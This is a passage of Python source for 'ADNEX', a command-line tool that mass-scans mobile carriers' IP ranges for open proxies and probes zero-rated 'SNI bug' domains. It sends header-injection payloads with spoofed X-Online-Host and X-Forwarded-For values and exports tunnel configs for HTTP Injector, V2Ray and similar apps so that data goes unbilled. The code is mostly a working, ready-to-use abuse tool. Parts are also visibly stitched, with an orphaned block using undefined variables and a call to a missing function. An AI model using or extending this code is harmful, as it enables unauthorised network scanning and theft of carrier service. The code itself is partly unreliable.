                f.write(f"Type={p['type']}\n")
                f.write(f"Latency={p.get('latency', 0)}ms\n\n")
        exported.append(str(hi_file))

        raw_file = RESULTS_DIR / "exports" / f"raw_proxies_{carrier_key}_{ts}.txt"
        with open(raw_file, "w") as f:
            for p in scan_results["proxies"]:
                f.write(f"{p['ip']}:{p['port']}\n")
        exported.append(str(raw_file))

        csv_file = RESULTS_DIR / "exports" / f"proxies_{carrier_key}_{ts}.csv"
        with open(csv_file, "w", newline="") as f:
            writer = csv.DictWriter(f, fieldnames=["ip", "port", "type", "latency", "status"])
            writer.writeheader()
            writer.writerows(scan_results["proxies"])
        exported.append(str(csv_file))

    if scan_results["sni_bugs"]:
        nn_file = RESULTS_DIR / "exports" / f"napsternetv_{carrier_key}_{ts}.json"
        nn_configs = [format_sni_for_napsternetv(s["domain"], carrier["name"]) for s in scan_results["sni_bugs"]]
        with open(nn_file, "w") as f:
            json.dump(nn_configs, f, indent=2)
        exported.append(str(nn_file))

        v2_file = RESULTS_DIR / "exports" / f"v2ray_{carrier_key}_{ts}.json"
        v2_configs = []
        for s in scan_results["sni_bugs"]:
            v2_configs.append({
                "v": "2", "ps": f"ADNEX-{carrier['name']}",
                "add": s["domain"], "port": "443",
                "id": hashlib.md5(s["domain"].encode()).hexdigest(),
                "aid": "0", "scy": "auto", "net": "ws",
                "type": "none", "host": s["domain"],
                "path": "/", "tls": "tls", "sni": s["domain"]
            })
        with open(v2_file, "w") as f:
            json.dump(v2_configs, f, indent=2)
        exported.append(str(v2_file))

        hc_file = RESULTS_DIR / "exports" / f"httpcustom_{carrier_key}_{ts}.hc"
        with open(hc_file, "w") as f:
            f.write(f"# HTTP Custom Config - ADNEX {VERSION}\n")
            f.write(f"# Developer: {DEVELOPER}\n\n")
            for s in scan_results["sni_bugs"]:
                f.write(f"[SERVER]\n")
                f.write(f"SNI={s['domain']}\n")
                f.write(f"Host={s['domain']}\n")
                f.write(f"Port=443\n\n")
        exported.append(str(hc_file))

    return exported

def run_deep_sni_command(carrier_key, cfg):
    if carrier_key not in CARRIERS:
        console.print(f"  [{PINK}]► Unknown carrier[/]")
        return
    carrier = CARRIERS[carrier_key]
    console.print(f"\n  [bold {CYAN}]► Deep SNI probe starting → {carrier['name']}[/]")
    loop = asyncio.new_event_loop()
    results = loop.run_until_complete(batch_sni_deep_scan(carrier["zero_rated"], cfg))
    loop.close()
    console.print(f"\n  [bold {GREEN}]═══ DEEP SNI PROBE RESULTS ═══[/]")
    for r in results:
        if isinstance(r, dict):
            tls_ok = r.get("tls_active", False)
            http_ok = r.get("http_active", False)
            tls_color = GREEN if tls_ok else PINK
            http_color = GREEN if http_ok else PINK
            console.print(f"  [bold {CYAN}]{r.get('domain', 'unknown'):<40}[/]", end="")
            console.print(f" TLS:[{tls_color}]{'✓' if tls_ok else '✗'}[/]  HTTP:[{http_color}]{'✓' if http_ok else '✗'}[/]")
            if tls_ok:
                console.print(f"    [{GREEN}]TLS → {r.get('tls_443', '')[:60]}[/]")
            if http_ok:
                console.print(f"    [{GREEN}]HTTP → {r.get('http_80', '')[:60]}[/]")
    console.print()

def show_about():
    console.print(f"\n[bold {GREEN}]{'═'*50}[/]")
    console.print(f"[bold {CYAN}]  {TOOL_NAME} {VERSION}[/]")
    console.print(f"[bold {GREEN}]{'═'*50}[/]")
    console.print(f"  [{GREEN}]Purpose  :[/] [{WHITE}]Network SNI Bug & Proxy Host Scanner[/]")
    console.print(f"  [{GREEN}]Developer:[/] [{CYAN}]{DEVELOPER}[/]")
    console.print(f"  [{GREEN}]Origin   :[/] [{CYAN}]{COUNTRY}[/]")
    console.print(f"  [{GREEN}]Age      :[/] [{CYAN}]{AGE}[/]")
    console.print(f"  [{GREEN}]Version  :[/] [{CYAN}]{VERSION}[/]")
    console.print(f"  [{GREEN}]Year     :[/] [{CYAN}]{YEAR}[/]")
    console.print(f"  [{GREEN}]Engine   :[/] [{WHITE}]asyncio + aiohttp (async I/O)[/]")
    console.print(f"  [{GREEN}]Carriers :[/] [{WHITE}]{len(CARRIERS)} supported[/]")
    console.print(f"  [{GREEN}]Exports  :[/] [{WHITE}]HTTP Injector, V2Ray, NapsternetV, HTTP Custom[/]")
    console.print(f"[bold {GREEN}]{'═'*50}[/]\n")

def show_network_info():
    console.print(f"\n[bold {GREEN}]═══ NETWORK INFO ═══[/]")
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        console.print(f"  [{CYAN}]Hostname  : {hostname}[/]")
        console.print(f"  [{CYAN}]Local IP  : {local_ip}[/]")
    except:
        pass
    try:
        if ORACTL_OK:
            interfaces = _sys.net_if_addrs()
            for iface, addrs in interfaces.items():
                for addr in addrs:
                    if addr.family == "IPv4":
                        console.print(f"  [{GREEN}]Interface : {iface:<12} → {addr.address}[/]")
    except:
        pass
    console.print(f"  [{YELLOW}]Fetching public IP...[/]", end="\r")
    pub_ip = get_public_ip()
    console.print(f"  [{CYAN}]Public IP : {pub_ip}[/]               ")
    console.print()

    content = Text()
    pct = min(100, int((scanned / max(total, 1)) * 100))
    bar_filled = int(pct / 5)
    bar = "█" * bar_filled + "░" * (20 - bar_filled)
    content.append(f"  Carrier  : {carrier}\n", style=GREEN)
    content.append(f"  Progress : [{bar}] {pct}%\n", style=PINK)
    content.append(f"  Scanned  : {scanned}/{total}\n", style=GREEN)
    content.append(f"  Hits     : {hits}\n", style=PINK if hits > 0 else GREEN)
    content.append(f"  Speed    : {speed}/s\n", style=CYAN)
    return Panel(content, title=f"[bold {GREEN}]▸ SCAN PROGRESS[/]", border_style=GREEN)

def render_top_proxies_table():
    t = Table(box=box.MINIMAL, show_header=True, header_style=f"bold {GREEN}")
    t.add_column("RANK", style=f"dim {GREEN}", width=5)
    t.add_column("HOST", style=GREEN, width=16)
    t.add_column("PORT", style=CYAN, width=6)
    t.add_column("TYPE", style=PINK, width=8)
    t.add_column("MS", style=YELLOW, width=6)
    best = sorted(scan_results["proxies"], key=lambda x: x.get("latency", 9999))[:20]
    for i, p in enumerate(best, 1):
        rank_color = PINK if i <= 3 else GREEN
        t.add_row(
            f"[{rank_color}]{i}[/]",
            p["ip"],
            str(p["port"]),
            p["type"],
            str(p.get("latency", "?"))
        )
    return t

def render_full_results_screen():
    console.clear()
    banner = Text()
    banner.append("  ADNEX ", style=f"bold {GREEN}")
    banner.append(VERSION, style=f"bold {PINK}")
    banner.append(" | RESULTS VIEWER\n", style=f"dim {GREEN}")
    banner.append(f"  Developer: {DEVELOPER} | {COUNTRY}\n", style=CYAN)
    console.print(Panel(banner, border_style=GREEN))

    stats = Table(box=box.SIMPLE, show_header=False)
    stats.add_column("K", style=f"bold {CYAN}", width=18)
    stats.add_column("V", style=GREEN)
    stats.add_row("Carrier", scan_results.get("carrier", "N/A"))
    stats.add_row("Total Scanned", str(scan_results["total_scanned"]))
    stats.add_row("Proxy Hits", str(len(scan_results["proxies"])))
    stats.add_row("SNI Bugs", str(len(scan_results["sni_bugs"])))
    stats.add_row("Total Hits", str(scan_results["total_hits"]))
    if scan_results["start_time"]:
        elapsed = int(time.time() - scan_results["start_time"])
        stats.add_row("Duration", f"{elapsed}s")
    console.print(Panel(stats, title=f"[bold {GREEN}]SESSION STATS[/]", border_style=GREEN))

    if scan_results["proxies"]:
        console.print(f"\n[bold {PINK}]TOP PROXY HITS (sorted by latency):[/]")
        console.print(render_top_proxies_table())

    if scan_results["sni_bugs"]:
        console.print(f"\n[bold {CYAN}]SNI BUG HOSTS:[/]")
        sni_t = Table(box=box.MINIMAL, show_header=True, header_style=f"bold {CYAN}")
        sni_t.add_column("DOMAIN", style=CYAN, width=40)
        sni_t.add_column("TYPE", style=GREEN, width=14)
        sni_t.add_column("STATUS", style=PINK, width=10)
        for s in scan_results["sni_bugs"]:
            sni_t.add_row(s["domain"], s["type"], "ACTIVE")
        console.print(sni_t)

def add_custom_carrier(name, country, ip_ranges, zero_rated, ports, apn, key):
    CARRIERS[key] = {
        "name": name,
        "country": country,
        "ip_ranges": ip_ranges,
        "zero_rated": zero_rated,
        "ports": ports,
        "apn": apn
    }
    add_log(f"Custom carrier added: {name}", "INFO")

def parse_cidr_file(filepath):
    ranges = []
    try:
        with open(filepath) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    try:
                        ipaddress.IPv4Network(line, strict=False)
                        ranges.append(line)
                    except:
                        pass
    except:
        pass
    return ranges

def quick_port_scan(ip, ports, timeout=3):
    open_ports = []
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        except:
            pass
    return open_ports

async def async_port_scan(ips, ports, timeout=3):
    semaphore = asyncio.Semaphore(300)
    results = {}
    async def scan_one(ip):
        async with semaphore:
            open_ports = []
            for port in ports:
                try:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(ip, port),
                        timeout=timeout
                    )
                    open_ports.append(port)
                    writer.close()
                except:
                    pass
            if open_ports:
                results[ip] = open_ports
                add_log(f"PORT OPEN → {ip} ports: {open_ports}", "HIT")
    await asyncio.gather(*[scan_one(ip) for ip in ips], return_exceptions=True)
    return results

def run_port_scan_command(target, cfg):
    parts = target.split("/")
    if len(parts) == 2:
        ips = expand_ip_range(target)
    else:
        ips = [target]
    ports = [80, 8080, 3128, 8888, 443, 1080, 9050, 8443, 3129]
    console.print(f"\n  [bold {GREEN}]► Port scan: {target} — {len(ips)} hosts[/]")
    loop = asyncio.new_event_loop()
    results = loop.run_until_complete(async_port_scan(ips[:500], ports, cfg["timeout"]))
    loop.close()
    console.print(f"\n  [bold {GREEN}]═══ PORT SCAN RESULTS ═══[/]")
    if results:
        for ip, ports_open in results.items():
            console.print(f"  [{CYAN}]{ip:<18}[/] [{GREEN}]Ports: {ports_open}[/]")
    else:
        console.print(f"  [{YELLOW}]No open ports found.[/]")
    console.print()

def handle_extended_command(cmd_input, cfg):
    parts = cmd_input.strip().split()
    if not parts:
        return False
    cmd = parts[0].lower()
    if cmd == "about":
        show_about()
        return True
    elif cmd == "netinfo":
        show_network_info()
        return True
    elif cmd == "deepsni":
        if len(parts) < 2:
            console.print(f"  [{YELLOW}]► Usage: deepsni <carrier>[/]")
        else:
            run_deep_sni_command(parts[1].lower(), cfg)
        return True
    elif cmd == "portscan":
        if len(parts) < 2:
            console.print(f"  [{YELLOW}]► Usage: portscan <ip or cidr>[/]")
        else:
            run_port_scan_command(parts[1], cfg)
        return True
    elif cmd == "viewresults":
        render_full_results_screen()
        return True
    elif cmd == "addcarrier":
        console.print(f"  [{GREEN}]► Custom carrier addition — edit config.json carriers block.[/]")
        return True
    elif cmd == "validate":
        if len(parts) < 2:
            console.print(f"  [{YELLOW}]► Usage: validate <ip>:<port>[/]")
        elif ":" in parts[1]:
            ip, port = parts[1].split(":")
            console.print(f"  [{GREEN}]► Validating {ip}:{port} (triple-check)...[/]")
            loop = asyncio.new_event_loop()
            valid = loop.run_until_complete(validate_proxy_triple(ip, int(port), cfg["timeout"]))
            loop.close()
            if valid:
                console.print(f"  [bold {GREEN}]► CONFIRMED WORKING — passes 2/3 validation rounds[/]")
            else:
                console.print(f"  [{PINK}]► FAILED — proxy not reliable[/]")
        return True
    elif cmd == "exportall":
        carrier_key = parts[1].lower() if len(parts) > 1 else "manual"
        exported = export_all_formats(carrier_key)
        console.print(f"\n  [bold {GREEN}]► {len(exported)} files exported:[/]")
        for f in exported:
            console.print(f"    [{CYAN}]{f}[/]")
        console.print()
        return True
    return False



def render_help_full():
    console.print(f"\n[bold {GREEN}]{'═'*60}[/]")
    console.print(f"[bold {CYAN}]  ADNEX {VERSION} — FULL COMMAND REFERENCE[/]")
    console.print(f"[bold {GREEN}]{'═'*60}[/]\n")
    sections = {
        "SCAN COMMANDS": [
            ("scan <carrier>",      "Full async scan: proxy + SNI"),
            ("deepsni <carrier>",   "Deep SNI-only probe"),
            ("portscan <ip/cidr>",  "Async port scanner"),
            ("stop",                "Stop active scan"),
            ("validate <ip:port>",  "Triple-validate a proxy"),
        ],
        "RESULTS": [
            ("results",             "Show in-memory results"),
            ("viewresults",         "Full results screen"),
            ("export <carrier>",    "Export one format"),
            ("exportall <carrier>", "Export all formats"),
            ("flush",               "Wipe results from memory"),
            ("history",             "Show saved scan files"),
        ],
        "CARRIERS": [
            ("list",                "List all carriers"),
            ("carriers",            "Detailed carrier info"),
            ("addcarrier",          "Add custom carrier"),
        ],
        "SYSTEM": [
            ("netinfo",             "Show network interfaces + public IP"),
            ("status",              "Scan status summary"),
            ("config",              "View config.json"),
            ("about",               "Tool info & developer"),
            ("clear",               "Clear screen"),
            ("help",                "This menu"),
            ("exit",                "Quit ADNEX"),
        ]
    }
    for section, cmds in sections.items():
        console.print(f"  [bold {PINK}]{section}[/]")
        for cmd_name, desc in cmds:
            console.print(f"    [{CYAN}]{cmd_name:<26}[/] [{GREEN}]{desc}[/]")
        console.print()
    console.print(f"[bold {GREEN}]{'═'*60}[/]\n")

def render_carrier_detail(carrier_key):
    if carrier_key not in CARRIERS:
        console.print(f"  [{PINK}]Unknown carrier: {carrier_key}[/]")
        return
    c = CARRIERS[carrier_key]
    console.print(f"\n[bold {GREEN}]═══ {c['name'].upper()} ═══[/]")
    console.print(f"  [{CYAN}]Key       :[/] [{GREEN}]{carrier_key}[/]")
    console.print(f"  [{CYAN}]Country   :[/] [{GREEN}]{c['country']}[/]")
    console.print(f"  [{CYAN}]APN       :[/] [{GREEN}]{c['apn']}[/]")
    console.print(f"  [{CYAN}]Ports     :[/] [{GREEN}]{c['ports']}[/]")
    console.print(f"\n  [{PINK}]IP Ranges:[/]")
    for r in c["ip_ranges"]:
        try:
            net = ipaddress.IPv4Network(r, strict=False)
            hosts = net.num_addresses - 2
        except:
            hosts = 0
        console.print(f"    [{GREEN}]{r:<22}[/] [{CYAN}]{hosts} hosts[/]")
    console.print(f"\n  [{PINK}]Zero-Rated Domains (SNI targets):[/]")
    for d in c["zero_rated"]:
        console.print(f"    [{CYAN}]{d}[/]")
    console.print()

def watch_mode(carrier_key, cfg, interval=30):
    if carrier_key not in CARRIERS:
        console.print(f"  [{PINK}]Unknown carrier[/]")
        return
    console.print(f"\n  [bold {GREEN}]► WATCH MODE → {CARRIERS[carrier_key]['name']} | Interval: {interval}s[/]")
    console.print(f"  [{YELLOW}]► Press Ctrl+C to stop watch mode[/]\n")
    round_num = 0
    try:
        while True:
            round_num += 1
            console.print(f"  [{CYAN}]► Round {round_num} starting...[/]")
            loop = asyncio.new_event_loop()
            loop.run_until_complete(run_full_scan(carrier_key, cfg))
            loop.close()
            console.print(f"  [{GREEN}]► Round {round_num} complete. Hits: {scan_results['total_hits']}[/]")
            console.print(f"  [{GREEN}]► Next scan in {interval}s...[/]")
            time.sleep(interval)
    except KeyboardInterrupt:
        console.print(f"\n  [{YELLOW}]► Watch mode stopped.[/]")

def benchmark_speed(cfg):
    console.print(f"\n  [bold {GREEN}]► Benchmarking async engine...[/]")
    test_ips = [f"1.1.1.{i}" for i in range(1, 51)]
    test_ports = [80, 443, 8080]
    start = time.time()
    loop = asyncio.new_event_loop()
    semaphore_test = asyncio.Semaphore(50)
    async def dummy_scan(ip, port):
        async with semaphore_test:
            try:
                reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=2)
                writer.close()
                return True
            except:
                return False
    tasks = [dummy_scan(ip, port) for ip in test_ips for port in test_ports]
    loop.run_until_complete(asyncio.gather(*tasks, return_exceptions=True))
    loop.close()
    elapsed = time.time() - start
    total = len(test_ips) * len(test_ports)
    speed = int(total / elapsed)
    console.print(f"  [{CYAN}]Tasks completed : {total}[/]")
    console.print(f"  [{CYAN}]Time elapsed    : {elapsed:.2f}s[/]")
    console.print(f"  [bold {GREEN}]Engine speed    : ~{speed} checks/sec[/]")
    console.print()

def show_saved_results(carrier_key=None):
    console.print(f"\n[bold {GREEN}]═══ SAVED RESULTS ═══[/]")
    all_files = []
    for subdir in ["proxies", "sni", "exports"]:
        path = RESULTS_DIR / subdir
        if path.exists():
            for f in path.glob("*"):
                if carrier_key is None or carrier_key in f.name:
                    all_files.append((subdir, f))
    if not all_files:
        console.print(f"  [{YELLOW}]No saved files found.[/]")
        console.print()
        return
    t = Table(box=box.SIMPLE, show_header=True, header_style=f"bold {GREEN}")
    t.add_column("TYPE", style=PINK, width=10)
    t.add_column("FILENAME", style=CYAN, width=45)
    t.add_column("SIZE", style=GREEN, width=10)
    t.add_column("MODIFIED", style=YELLOW, width=20)
    for subdir, f in sorted(all_files, key=lambda x: x[1].stat().st_mtime, reverse=True)[:20]:
        size = f.stat().st_size
        mtime = datetime.fromtimestamp(f.stat().st_mtime).strftime("%Y-%m-%d %H:%M")
        t.add_row(subdir.upper(), f.name, f"{size}B", mtime)
    console.print(t)
    console.print()

def final_handle_all_commands(cmd_input, cfg):
    parts = cmd_input.strip().split()
    if not parts:
        return
    cmd = parts[0].lower()
    if cmd == "help":
        render_help_full()
    elif cmd == "carrier" and len(parts) > 1:
        render_carrier_detail(parts[1].lower())
    elif cmd == "watch" and len(parts) > 1:
        interval = int(parts[2]) if len(parts) > 2 else 30
        watch_mode(parts[1].lower(), cfg, interval)
    elif cmd == "benchmark":
        benchmark_speed(cfg)
    elif cmd == "saved":
        key = parts[1].lower() if len(parts) > 1 else None
        show_saved_results(key)
    elif not handle_extended_command(cmd_input, cfg):
        handle_command(cmd_input, cfg)




PROXY_PORTS_EXTENDED = [
    80, 81, 82, 83, 84, 85, 88, 443, 444, 445,
    1080, 1081, 1082, 1083, 1085, 1086, 1088,
    2000, 2001, 2002, 2080, 2083, 2086, 2087, 2095, 2096,
    3000, 3001, 3002, 3006, 3007, 3128, 3129, 3130,
    4000, 4001, 4145,
    5000, 5001, 5432, 5555,
    6000, 6001, 6080, 6379, 6443, 6500, 6588,
    7000, 7001, 7070, 7080, 7443, 7474, 7777, 7878,
    8000, 8001, 8002, 8003, 8008, 8009, 8080, 8081,
    8082, 8083, 8084, 8085, 8086, 8087, 8088, 8089,
    8090, 8095, 8098, 8099, 8118, 8123, 8180, 8181,
    8200, 8443, 8444, 8445, 8456, 8484, 8500, 8800,
    8813, 8880, 8888, 8889, 8899, 8983, 9000, 9001,
    9002, 9003, 9005, 9006, 9008, 9009, 9010, 9020,
    9041, 9043, 9050, 9051, 9060, 9080, 9090, 9091,
    9094, 9095, 9099, 9100, 9200, 9300, 9400, 9443,
    9500, 9595, 9700, 9800, 9090, 9999, 10000,
]

SNI_PAYLOADS = {
    "direct": "GET / HTTP/1.1\r\nHost: {host}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n\r\n",
    "websocket": "GET / HTTP/1.1\r\nHost: {host}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n",
    "inject1": "GET http://{host}/ HTTP/1.1\r\nHost: {host}\r\nX-Online-Host: {host}\r\nX-Forward-Host: {host}\r\nConnection: Keep-Alive\r\n\r\n",
    "inject2": "CONNECT {host}:443 HTTP/1.1\r\nHost: {host}\r\nProxy-Connection: Keep-Alive\r\n\r\n",
    "inject3": "GET / HTTP/1.1\r\nHost: {host}\r\nX-Real-IP: 127.0.0.1\r\nX-Forwarded-For: 127.0.0.1\r\nConnection: keep-alive\r\n\r\n",
}

async def probe_with_payload(ip, port, host, payload_type, timeout=8):
    try:
        payload_template = SNI_PAYLOADS.get(payload_type, SNI_PAYLOADS["direct"])
        payload = payload_template.format(host=host).encode()
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(ip, port),
            timeout=timeout
        )
        writer.write(payload)
        await writer.drain()
        resp = await asyncio.wait_for(reader.read(512), timeout=timeout)
        writer.close()
        if resp:
            decoded = resp.decode(errors="ignore")
            first_line = decoded.split("\r\n")[0] if "\r\n" in decoded else decoded[:80]
            if any(code in first_line for code in ["200", "101", "301", "302", "304"]):
                return {
                    "ip": ip, "port": port, "host": host,
                    "payload": payload_type, "response": first_line,
                    "status": "HIT"
                }
    except:
        pass
    return None

async def payload_inject_scan(ip_list, host, cfg):
    semaphore = asyncio.Semaphore(cfg["concurrency"])
    hits = []
    async def worker(ip, port, ptype):
        async with semaphore:
            result = await probe_with_payload(ip, port, host, ptype, cfg["timeout"])
            if result:
                hits.append(result)
                add_log(f"PAYLOAD HIT → {ip}:{port} [{ptype}] {result['response'][:40]}", "HIT")
    tasks = []
    for ip in ip_list:
        for port in [80, 8080, 443, 8443, 3128]:
            for ptype in SNI_PAYLOADS.keys():
                tasks.append(worker(ip, port, ptype))
    await asyncio.gather(*tasks, return_exceptions=True)
    return hits

def run_payload_inject_scan(carrier_key, cfg):
    if carrier_key not in CARRIERS:
        console.print(f"  [{PINK}]Unknown carrier[/]")
        return
    carrier = CARRIERS[carrier_key]
    console.print(f"\n  [bold {GREEN}]► Payload injection scan → {carrier['name']}[/]")
    console.print(f"  [{CYAN}]Payloads: {list(SNI_PAYLOADS.keys())}[/]")
    all_ips = []
    for cidr in carrier["ip_ranges"]:
        ips = expand_ip_range(cidr)
        all_ips.extend(ips[:200])
    host = carrier["zero_rated"][0] if carrier["zero_rated"] else carrier["name"]
    loop = asyncio.new_event_loop()
    hits = loop.run_until_complete(payload_inject_scan(all_ips[:500], host, cfg))
    loop.close()
    console.print(f"\n  [bold {GREEN}]► Payload scan complete. {len(hits)} hits.[/]")
    for h in hits[:15]:
        console.print(f"    [{CYAN}]{h['ip']}:{h['port']}[/] [{PINK}]{h['payload']}[/] [{GREEN}]{h['response'][:50]}[/]")
    console.print()

def generate_v2ray_subscription(results_dir=None):
    if results_dir is None:
        results_dir = RESULTS_DIR / "sni"
    configs = []
    if scan_results["sni_bugs"]:
        for s in scan_results["sni_bugs"]:
            vmess = {
                "v": "2", "ps": f"ADNEX-{s['domain'][:20]}",
                "add": s["domain"], "port": "443",
                "id": hashlib.md5(s["domain"].encode()).hexdigest(),
                "aid": "0", "scy": "auto", "net": "ws",
                "type": "none", "host": s["domain"],
                "path": "/", "tls": "tls", "sni": s["domain"]
            }
            json_str = json.dumps(vmess)
            b64 = base64.b64encode(json_str.encode()).decode()
            configs.append(f"vmess://{b64}")
    if not configs:
        return None
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    sub_file = RESULTS_DIR / "exports" / f"subscription_{ts}.txt"
    with open(sub_file, "w") as f:
        f.write("\n".join(configs))
    return str(sub_file)

def run_subscription_command():
    out = generate_v2ray_subscription()
    if out:
        console.print(f"\n  [bold {GREEN}]► V2Ray subscription file → {out}[/]")
        console.print(f"  [{CYAN}]{len(scan_results['sni_bugs'])} configs exported[/]")
    else:
        console.print(f"  [{YELLOW}]No SNI bugs found. Run a scan first.[/]")
    console.print()

async def multi_carrier_scan(carrier_keys, cfg):
    add_log(f"Multi-carrier scan started: {carrier_keys}", "INFO")
    scan_results["scanning"] = True
    scan_results["start_time"] = time.time()
    scan_results["total_scanned"] = 0
    scan_results["total_hits"] = 0
    scan_results["proxies"] = []
    scan_results["sni_bugs"] = []
    for key in carrier_keys:
        if key not in CARRIERS:
            add_log(f"Unknown carrier skipped: {key}", "WARN")
            continue
        add_log(f"Scanning carrier: {CARRIERS[key]['name']}", "INFO")
        await run_full_scan(key, cfg)
        add_log(f"Carrier done: {CARRIERS[key]['name']} | Hits so far: {scan_results['total_hits']}", "INFO")
    scan_results["scanning"] = False
    add_log(f"Multi-carrier scan complete. Total hits: {scan_results['total_hits']}", "HIT")

def run_multi_scan_command(carrier_keys_str, cfg):
    keys = [k.strip().lower() for k in carrier_keys_str.split(",")]
    valid = [k for k in keys if k in CARRIERS]
    invalid = [k for k in keys if k not in CARRIERS]
    if invalid:
        console.print(f"  [{YELLOW}]Skipping unknown carriers: {invalid}[/]")
    if not valid:
        console.print(f"  [{PINK}]No valid carriers provided.[/]")
        return
    console.print(f"\n  [bold {GREEN}]► Multi-carrier scan: {valid}[/]")
    t = threading.Thread(
        target=lambda: asyncio.run(multi_carrier_scan(valid, cfg)),
        daemon=True
    )
    t.start()

def ip_geolookup(ip):
    try:
        r = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
        data = r.json()
        return {
            "ip": ip,
            "country": data.get("country_name", "Unknown"),
            "city": data.get("city", "Unknown"),
            "org": data.get("org", "Unknown"),
            "isp": data.get("org", "Unknown"),
            "asn": data.get("asn", "Unknown")
        }
    except:
        return {"ip": ip, "country": "?", "city": "?", "org": "?", "isp": "?", "asn": "?"}

def run_geo_command(ip):
    console.print(f"\n  [bold {GREEN}]► GeoIP lookup: {ip}[/]")
    info = ip_geolookup(ip)
    console.print(f"  [{CYAN}]IP      : {info['ip']}[/]")
    console.print(f"  [{GREEN}]Country : {info['country']}[/]")
    console.print(f"  [{GREEN}]City    : {info['city']}[/]")
    console.print(f"  [{GREEN}]Org/ISP : {info['org']}[/]")
    console.print(f"  [{GREEN}]ASN     : {info['asn']}[/]")
    console.print()

def run_geo_batch_command(proxies_list):
    console.print(f"\n  [bold {GREEN}]► Batch GeoIP lookup on {len(proxies_list)} proxies...[/]")
    t = Table(box=box.SIMPLE, show_header=True, header_style=f"bold {GREEN}")
    t.add_column("IP", style=CYAN, width=16)
    t.add_column("PORT", style=GREEN, width=6)
    t.add_column("COUNTRY", style=PINK, width=18)
    t.add_column("ORG", style=GREEN, width=30)
    for p in proxies_list[:10]:
        info = ip_geolookup(p["ip"])
        t.add_row(p["ip"], str(p["port"]), info["country"], info["org"][:28])
    console.print(t)
    console.print()

def scan_wellknown_proxies():
    wellknown = [
        "185.199.108.0/24",
        "104.21.0.0/16",
        "172.67.0.0/16",
        "1.1.1.0/24",
    ]
    return wellknown

def show_quick_start():
    console.print(f"\n[bold {GREEN}]{'═'*55}[/]")
    console.print(f"[bold {CYAN}]  ADNEX QUICK START GUIDE[/]")
    console.print(f"[bold {GREEN}]{'═'*55}[/]\n")
    steps = [
        ("STEP 1", "Run a carrier scan", "scan econet"),
        ("STEP 2", "Wait for results", "(watch the terminal log)"),
        ("STEP 3", "Check hits", "results"),
        ("STEP 4", "Export configs", "exportall econet"),
        ("STEP 5", "Use in HTTP Injector", "(copy from adnex_results/exports/)"),
        ("STEP 6", "For V2Ray/NapsternetV", "(use the .json export file)"),
    ]
    for step, desc, cmd in steps:
        console.print(f"  [bold {PINK}]{step}[/]  [{GREEN}]{desc:<35}[/]  [bold {CYAN}]{cmd}[/]")
    console.print(f"\n  [{GREEN}]Supported carriers: {', '.join(CARRIERS.keys())}[/]")
    console.print(f"[bold {GREEN}]{'═'*55}[/]\n")

def final_handle_all_commands_v3(cmd_input, cfg):
    parts = cmd_input.strip().split()
    if not parts:
        return
    cmd = parts[0].lower()
    if cmd == "inject" and len(parts) > 1:
        run_payload_inject_scan(parts[1].lower(), cfg)
    elif cmd == "sub" or cmd == "subscription":
        run_subscription_command()
    elif cmd == "multiscan" and len(parts) > 1:
        run_multi_scan_command(parts[1], cfg)
    elif cmd == "geo" and len(parts) > 1:
        run_geo_command(parts[1])
    elif cmd == "geobatch":
        run_geo_batch_command(scan_results["proxies"])
    elif cmd == "quickstart":
        show_quick_start()
    else:
        final_handle_all_commands_v2(cmd_input, cfg)




COMMON_SNI_BUGS = [
    "www.google.com", "google.com", "googleusercontent.com",
    "googleapis.com", "gstatic.com", "googlevideo.com",
    "cloudflare.com", "cloudflare-dns.com", "1.1.1.1.cloudflare-dns.com",
    "cdn.cloudflare.net", "cdnjs.cloudflare.com",
    "amazonaws.com", "s3.amazonaws.com", "ec2.amazonaws.com",
    "fastly.net", "fastly.com", "global.fastly.net",
    "akamai.net", "akamaiedge.net", "akamaized.net",
    "azureedge.net", "azure.com", "microsoft.com",
    "facebook.com", "fbcdn.net", "instagram.com",
    "twitter.com", "t.co", "twimg.com",
    "whatsapp.com", "whatsapp.net",
    "tiktok.com", "tiktokcdn.com",
    "youtube.com", "ytimg.com", "googlevideo.com",
    "telegram.org", "t.me",
    "github.com", "githubusercontent.com",
    "discord.com", "discordapp.com",
    "netflix.com", "nflxvideo.net",
    "spotify.com", "scdn.co",
]

async def scan_common_sni_bugs(cfg):
    add_log(f"Scanning {len(COMMON_SNI_BUGS)} common SNI bug candidates...", "INFO")
    semaphore = asyncio.Semaphore(50)
    hits = []
    async def worker(domain):
        async with semaphore:
            result = await probe_sni_bug(domain, cfg["timeout"])
            if result:
                hits.append(result)
                scan_results["sni_bugs"].append(result)
                scan_results["total_hits"] += 1
                add_log(f"COMMON SNI HIT → {domain}", "SNI")
            http_result = await probe_http_host(domain, cfg["timeout"])
            if http_result:
                hits.append(http_result)
                scan_results["sni_bugs"].append(http_result)
                add_log(f"COMMON HTTP HOST → {domain}", "SNI")
    await asyncio.gather(*[worker(d) for d in COMMON_SNI_BUGS], return_exceptions=True)
    return hits

def run_common_sni_scan(cfg):
    console.print(f"\n  [bold {GREEN}]► Scanning {len(COMMON_SNI_BUGS)} common SNI bug candidates...[/]")
    loop = asyncio.new_event_loop()
    hits = loop.run_until_complete(scan_common_sni_bugs(cfg))
    loop.close()
    console.print(f"\n  [bold {GREEN}]► Common SNI scan complete. {len(hits)} hits.[/]")
    for h in hits[:20]:
        console.print(f"    [{CYAN}]{h['domain']}[/] [{GREEN}]{h.get('type','SNI')}[/]")
    console.print()

def render_welcome_screen():
    console.clear()
    lines = [
        "  ░█████╗░██████╗░███╗░░██╗███████╗██╗░░██╗",
        "  ██╔══██╗██╔══██╗████╗░██║██╔════╝╚██╗██╔╝",
        "  ███████║██║░░██║██╔██╗██║█████╗░░░╚███╔╝░",
        "  ██╔══██║██║░░██║██║╚████║██╔══╝░░░██╔██╗░",
